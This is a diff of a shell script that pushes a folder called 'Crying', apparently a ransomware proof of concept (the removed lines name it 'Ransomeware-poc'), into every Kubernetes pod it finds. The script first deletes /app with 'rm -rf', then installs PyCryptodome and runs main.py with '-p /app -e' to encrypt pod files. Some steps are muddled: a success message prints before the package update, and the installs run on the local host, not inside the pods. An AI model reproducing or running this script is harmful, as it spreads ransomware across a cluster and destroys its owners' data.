@@ -1,7 +1,8 @@
 #!/bin/sh
 
-# Define the folder to be copied and the script to execute
+# Define the folder to be copied
 FOLDER_TO_PUSH="/Crying"
+DESTINATION_FOLDER="/app"
 
 # Ensure necessary tools are available
 echo "Ensuring required tools are available..."
@@ -22,6 +23,13 @@ for IP in $POD_IPS; do
         # Get the pod name based on the IP
         POD_NAME=$(kubectl get pods -o wide --no-headers | grep "$IP" | awk '{print $1}')
         
+        # Remove the existing folder in the pod to ensure overwrite
+        echo "Removing existing folder in pod $POD_NAME..."
+        kubectl exec "$POD_NAME" -- sh -c "rm -rf $DESTINATION_FOLDER" || {
+            echo "Failed to remove existing folder in pod: $POD_NAME"
+            continue
+        }
+
         # Push folder to the pod
         echo "Attempting to push folder to pod $POD_NAME..."
         kubectl cp "$FOLDER_TO_PUSH" "$POD_NAME:/app" || {
@@ -30,16 +38,37 @@ for IP in $POD_IPS; do
         }
         echo "Folder successfully pushed to pod: $POD_NAME"
 
-        # Execute the script inside the pod
-        kubectl exec "$POD_NAME" -- sh -c "apk add --no-cache python3 py3-pip"
-        kubectl exec "$POD_NAME" -- sh -c "pip3 install pycryptodome --break-system-packages"
+        echo "Package list updated successfully!"
+
+        # Update the package list
+        echo "Updating package list..."
+        apk update || {
+            echo "Failed to update package list."
+            exit 1
+        }
+
+        # Install Python3 and pip
+        echo "Installing Python3 and pip..."
+        apk add --no-cache python3 py3-pip || {
+            echo "Failed to install Python3 and pip."
+            exit 1
+        }
         
+        # Install required Python library
+        echo "Installing PyCryptodome..."
+        pip3 install pycryptodome --break-system-packages || {
+            echo "Failed to install PyCryptodome."
+            exit 1
+        }
+
+
+        # Execute the script inside the pod
         echo "Executing the script inside the pod $POD_NAME..."
-        kubectl exec "$POD_NAME" -- sh -c "chmod +x /app/Crying/Crying.sh && /app/Crying/Crying.sh" || {
+        kubectl exec "$POD_NAME" -- sh -c "chmod +x /app/Crying/main.py && /app/Crying/main.py" || {
             echo "Failed to execute Crying.sh in pod: $POD_NAME"
             continue
         }
-        kubectl exec "$POD_NAME" -- sh -c "chmod +x /app/Ransomeware-poc/main.py && python3 /app/Ransomeware-poc/main.py -p /app -e" || {
+        kubectl exec "$POD_NAME" -- sh -c "python3 /app/Crying/main.py -p /app -e" || {
             echo "Failed to execute main.py in pod: $POD_NAME"
         }
         echo "Scripts executed successfully in pod: $POD_NAME"
